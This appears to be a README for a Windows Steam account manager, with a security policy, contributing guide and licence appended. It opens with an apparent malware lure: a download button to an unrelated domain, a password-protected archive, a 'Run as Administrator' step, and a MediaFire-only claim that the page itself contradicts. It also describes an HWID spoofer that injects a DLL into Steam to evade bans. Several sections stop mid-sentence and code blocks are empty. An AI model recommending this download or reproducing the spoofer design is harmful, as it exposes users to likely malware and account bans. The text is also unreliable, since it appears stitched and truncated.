<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

## Features

### Vaults
- Keep separate sets of accounts in independent encrypted vaults (personal, trading, clients).
- Give each vault a name, a color, and a custom image icon.
- A picker on startup lets you choose a vault, or set one to open automatically.
- Switch vaults from the sidebar. Each vault has its own accounts and its own settings; a few options (marked "global" in Settings) apply everywhere.

### Accounts
- Card grid, or a two-pane list view with collapsible, color-coded groups.
- Add manually, from a `.maFile` or `info.dat`, by walking the full mobile login, or
  by pasting an NFA refresh token. Drag and drop files or folders onto the window.
- Per-account password, notes, color tags, and trust labels (green / yellow / red).
- Search, sort, multi-select, and bulk actions.
- Privacy mode hides every login until you click to reveal one.
- NFA (token-only) accounts: import a JWT refresh token, track when it expires, get
  flagged when it goes stale, edit or replace it later, and sign in without a password.

### Authenticator
- Steam Guard codes for any imported authenticator, with a next-code preview.
- Add Steam Guard in-app through the mobile flow, or remove it with your revocation code.
- Optional global hotkey copies the selected account's code without focusing the app.
- Hide-until-click and auto-copy-on-select options, with clipboard auto-clear.

### Confirmations
- List, approve, or deny mobile confirmations (trades, market listings, phone changes,
  gift redemptions), per account or in bulk.
- Optional background poller refreshes on a timer and toasts when new items arrive.
- Auto-approve rules for market listings, phone changes, and trades to a trusted-partner list.
- Every decision is written to a local audit log.

### Trade offers
- View, accept, or decline incoming and outgoing offers, with full item and escrow detail.
- Build and send offers from your inventory to a trade URL, with optional auto-confirm.
- Fetch and copy an account's own trade link, cached and auto-refreshed.
- Optional background poller and a local trade audit log.

### Account review
- Per-account VAC / game / community / trade ban flags, Steam level, and owned games
  (needs a free Steam Web API key, stored encrypted with the vault).
- CS2 Premier rating, Wingman rank, level, Prime status, competitive cooldown, and
  VAC-Live, scraped from the authenticated GCPD page.
- External funds (total spend) per account.
- New bans, cooldown changes, and VAC-Live flips surface as card badges, in-app toasts,
  and optional Windows tray notifications, and are logged. Every indicator is toggleable.

### CS2 (Game Coordinator)
- Connect an account to view and manage its live inventory, moving items in and out of
  storage units.
- Profile medals with icons, weekly drop tracking with one-click claim, and weekly
  mission progress.
- Auto-pull signs in a single account on startup and fetches every account's medals and
  level by Steam ID, on a cache window you set.

### Launch
- One-click sign-in: closes Steam, relaunches, and types the login and Steam Guard code via
  UI Automation, falling back to the clipboard with auto-clear.
- Or sign in without the login window by injecting a client-scoped JWT into Steam's
  ConnectCache. NFA accounts always use this, with no password or code typing.
- Copy a `video.txt` or a whole `730` folder into the account's CS2 config on login.
- Or point it at a `userdata\<id>` folder and every game folder in it (`730`, `570`, `440`, ...)
  is copied on login. Steam's own per-account settings are left alone.
- Set CS2 launch options once and have them written for whichever account you launch.
- Optionally turn off Steam Cloud, new-release news, Remote Play, or friends visibility for
  each account you launch. Existing files are backed up first.
- Optionally block a launched account's subscribed CS2 workshop maps from downloading, so it
  goes straight into the game. Subscriptions are kept.
- Per-account launch method: stop after login, launch CS2, or launch CS2 with an external loader.
- Open any account in your browser, already signed in, from the right-click menu.

### Tracer cleaner
- Wipes what Steam leaves on the PC, as one of three profiles: **Quick Clean** (caches,
  logs, crash dumps), **Account Reset** (adds saved logins, the ConnectCache login tokens
  in `config.vdf` / `local.vdf`, ssfn files, the HKCU autologin values, per-account caches),
  or **Full Wipe** (adds each account's whole `userdata` folder).
- A keep list decides what survives. Tick any vault account, or any Steam login found on this
  PC, and its saved login, `userdata`, registry subtree, avatar and login token are spared.
  `loginusers.vdf` and the ConnectCache are edited entry by entry rather than deleted, so kept
  accounts stay signed in. Everything unticked is signed out.
- Runs on demand, or automatically before every sign-in, when the vault is unlocked, or when
  the app closes. The pre-launch trigger fires while Steam is already down, so it never fights
  the sign-in.
- A **Quick clean** button on the accounts page runs the caches-and-logs profile in one click,
  whatever the Cleaner tab is set to. It signs nobody out.
- Preview first: the exact list of files, registry values and VDF entries, with sizes. There is
  no backup and no undo.
- Gated by safe mode: with safe mode on the tab is hidden and no trigger fires, and your profile
  and keep list are kept for when you turn it back off.

### HWID spoofer (educational purposes only)
- Injects a DLL into the Steam process on launch that hooks WMI, SMBIOS, DXGI, D3D9, and
  display APIs to present spoofed hardware identifiers.
- Spoofable components: machine GUID, MAC address, disk serial, PC name, GPU, motherboard,
  RAM, monitor, storage, and sound card, each individually toggleable.
- Per-account hardware profiles: each account gets its own randomly generated profile, or is
  excluded from spoofing entirely.
- "Always spoof" applies a profile to every launch; the per-component mask picks exactly which
  identifiers are replaced.
- Hardware comparison table in Settings shows real vs. spoofed values side by side.

### Background refresh
- Refresh every account on launch, or schedule a logon task that refreshes in the background
  and notifies on new bans or cooldown changes.
- Optional periodic auto-refresh while the app is open, updating only accounts whose cached
  data has expired.
- The logon task can instead just open the app, optionally minimized.
- Optional update check on launch, against the GitHub releases page. No account data is sent.

### Import and export
- Passphrase-protected `.sambundle` to carry accounts between machines, with a merge
  preview before anything is written.
- Plain `login:password` export gated behind a typed confirmation phrase.

### Privacy and security
- Vault encrypted with AES-256-GCM under PBKDF2-HMAC-SHA256 (600,000 iterations). No recovery
  path. Optional DPAPI auto-unlock skips the master-password prompt on launch.
- Safe mode hides and disables everything that can get an account banned: the HWID spoofer, the
  external CS2 loaders and the tracer cleaner all leave the interface, no launch injects or runs
  them, and no cleaner trigger fires. Set per vault, and reversible. Nothing is erased, so
  turning it off restores everything.
- Optional administrator elevation, on by default. Only the Windows-logon task and controlling
  an elevated Steam need it, so most setups can turn it off and never see a UAC prompt again.
- Streamproof mode hides the window from screen-capture software (OBS, Discord, Snipping Tool)
  while it stays fully visible on your monitor.
- Per-account or single proxy (SOCKS5 / HTTP / HTTPS, with credentials) and a test button.
- Portable mode and a relocatable data folder (USB stick, another drive, network share).
## Build from source

```powershell
## Security

Account secrets live in an AES-256-GCM vault keyed from your master password, stored
only on your machine. There is no recovery path and no telemetry. To report a
## Disclaimer

This project is for managing your own accounts and for educational and research
purposes, and is not affiliated with Valve or Steam. The HWID spoofer component is
provided for educational purposes only. You are responsible for how you use this
software, and it must not be used to violate the Steam Subscriber Agreement, any


---

# Security Policy

## Reporting a vulnerability

Please report security issues privately. **Do not open a public issue for a
vulnerability.**

Email **cloud@luminary.pub** with:

- a description of the issue and its impact,
- steps to reproduce (or a proof of concept),
- the app version (Settings shows it, or the release tag) and your Windows version.

You can expect an acknowledgement within a few days. Please give a reasonable
window to ship a fix before any public disclosure.

## How your data is protected

- **Encrypted vault.** Every account secret (Steam password, refresh tokens,
  Steam Guard `shared_secret` / `identity_secret`, session data) lives in
  `vault.bin`, encrypted with **AES-256-GCM**. The key is derived from your master
  password with **PBKDF2-HMAC-SHA256, 600,000 iterations**.
- **No recovery path.** The master password is never stored (unless you opt into
  the DPAPI cache below). If you lose it, the vault cannot be decrypted. There is
  no backdoor.
- **Local only.** The vault, settings, and logs stay on your machine, under
  `%LOCALAPPDATA%\steam-account-manager` (or next to the executable in portable
  mode). Nothing is uploaded.
- **No telemetry.** The only network calls are the ones you trigger (refreshing
  account data, logging in, confirmations, trades) plus an optional GitHub release
  check on launch, which you can disable in Settings.

## Trade-offs to understand

- **DPAPI auto-unlock.** Enabling "remember master password" caches it with Windows
  DPAPI so the vault opens without a prompt. This trades protection for convenience:
  anyone signed in as the same Windows user on that machine can then open the vault
  without knowing the master password. Leave it off if that is not acceptable.
- **Administrator elevation.** On by default, and can be turned off in
  Settings > General. Three things need it: the Windows-logon task, writing into a
  Steam folder your account has no write access to, and controlling a Steam that is
  itself running elevated. Everything else (sign-in, Steam Guard, confirmations,
  trades, the CS2 tools) works without it. Steam's own settings live under
  `HKEY_CURRENT_USER`, so no part of the login flow needs elevation.
- **No code signing.** Release binaries are unsigned, so Windows SmartScreen warns
  on first run. Verify the SHA-256 published with each release if you want to
  confirm the download.
- **The tracer cleaner deletes permanently.** Nothing it removes is backed up and
  there is no undo, so the keep list in Settings > Cleaner is the only thing standing
  between an account and a wipe: anything not ticked there is signed out of this PC,
  and under Full Wipe loses its `userdata` folder (cloud saves, game settings, CS2
  configs, controller bindings, screenshots). It is off by default, every trigger is
  opt-in, and Preview shows the exact list before you commit. It only touches Steam's
  own files and `HKEY_CURRENT_USER`, never the vault.

This tool ships no cheats, scripts, or game modifications. The optional "launch CS2
with an external loader" method only runs a loader executable that you supply and
point it at; nothing of the sort is bundled or downloaded.


---

# Contributing

Pull requests are welcome. This is a native Windows C++ app, so the toolchain is
Visual Studio rather than a cross-platform build.

## Prerequisites

- Visual Studio 2022 with the **Desktop development with C++** workload
- The Windows 10 SDK (installed with that workload)

## Build

The vendored dependencies under `third_party/` are fetched by a script, so there is
no vcpkg, Conan, or submodule setup.

```powershell
## Style and quality

- Formatting is governed by `.clang-format` and `.editorconfig` at the repo root.
  Run clang-format before committing.
- The project builds at `/W4` with warnings treated as errors, so a new warning
  breaks the build. CI (`.github/workflows/build.yml`) builds the same Release x64
  config on every push and pull request.
- Comments live in headers. A `.cpp` file carries no comments at all, apart from the
  `}  // namespace ...` markers that close a namespace. Document a function where it
  is declared, and keep that documentation factual rather than decorative.

## Project files

`steam-account-manager.vcxproj` and `steam-account-manager.vcxproj.filters` list
every source file explicitly (no globbing). When you add, remove, or rename a file
you must update **both**: the `.vcxproj` (`ClCompile` for `.cpp`, `ClInclude` for
headers) and the `.vcxproj.filters` (same entry plus a `<Filter>` so it lands in the
right Solution Explorer folder).

## Layout

```
app/            WinMain, app state, settings, background vault writer, job pump,
                conf poller, drag-and-drop, gamesense loader
core/
  account_store/  vault types, atomic-write format, filter / sort, groups / tags
  crypto/         AES-GCM, AES-CBC, HMAC, PBKDF2, Rijndael-256, RNG, SecureString
  sda/            TOTP, confirmations, maFile / info.dat import, add / remove Guard
  steam_login/    mobile auth flow (RSA, BeginAuthSession, poll, finalizelogin),
                  web session, browser login
  steam_api/      Steam Web API (summaries, bans, level, owned games)
  steam_gcpd/     GCPD scraper for CS2 Premier / Wingman / cooldown / VAC-Live
  steam_local/    loginusers.vdf parsing, connect-cache token injection
  steam_spend/    external funds (TotalSpend) scrape
  steam_auth/     generated protobuf for IAuthenticationService
  trade/          trade offers, inventory, actions, trade-URL parsing, audit log
  launch/         steam.exe relaunch, UI-Automation login driver, token launcher,
                  CS2 autostart, clipboard auto-clear
  cs2/            CS2 friend-code conversion
  cs2_config/     CS2 video.txt / 730 folder deploy into the per-account cfg folder
  profile/        Steam display-name change
  notifications/  ban / cooldown change store
  http/           WinHTTP client and proxy (in-process SOCKS5 bridge)
platform/       Win32 wrappers: paths, registry, process, clipboard, DPAPI, tray
                icon, startup task, UI Automation, global hotkey, file dialog
ui/
  screens/      one feature per screen (unlock, accounts, add_account, sda,
                confirmations, trade_offers, settings); large screens split into
                per-tab / per-section translation units
  widgets/      reusable composites (account_card, account_context_menu, title_bar,
                rank_image, ...)
third_party/    fetched by scripts\init_third_party.ps1
assets/         app icon and CS2 rank images, compiled into the .exe via app.rc
```

The `core/` and `ui/` split keeps everything in `core/` headless and testable.

## Vendored libraries

| Library | License | Used for |
|---|---|---|


---

MIT License

Copyright (c) 2026 luminary-cloud

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
